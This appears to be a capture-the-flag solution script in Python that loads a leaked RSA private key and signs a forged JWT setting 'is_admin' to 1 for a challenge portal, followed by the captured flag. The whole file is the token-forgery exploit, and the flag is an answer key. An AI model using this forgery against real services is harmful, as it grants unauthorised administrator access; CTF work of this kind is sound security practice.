import jwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

private_key_path = './private.pem'
passphrase_path = './passphrase'

payload = {
    "iss": "http://jakarta.ctf.protergo.party:10003/api/portal_login",
    "iat": 1707449722,
    "exp": 1707453322,
    "nbf": 1707449722,
    "jti": "mBb7zAJ61Ch5wyDm",
    "sub": "15",
    "prv": "3da04507aadf132cee732fdee4ef6aa390dec579",
    "is_admin": 1
}

with open(private_key_path, 'rb') as key_file:
    with open(passphrase_path, 'rb') as passphrase_file:
        private_key = serialization.load_pem_private_key(
            data=key_file.read(),
            password=passphrase_file.read().strip(),
            backend=default_backend()
        )

token = jwt.encode(payload, private_key, algorithm='RS256', headers={"typ": "JWT"})
print(token)

# PROTERGO{f5016c424def47159321869c8e7ff4cac79b9e721c0d700cf7c0c8ab7f43b203}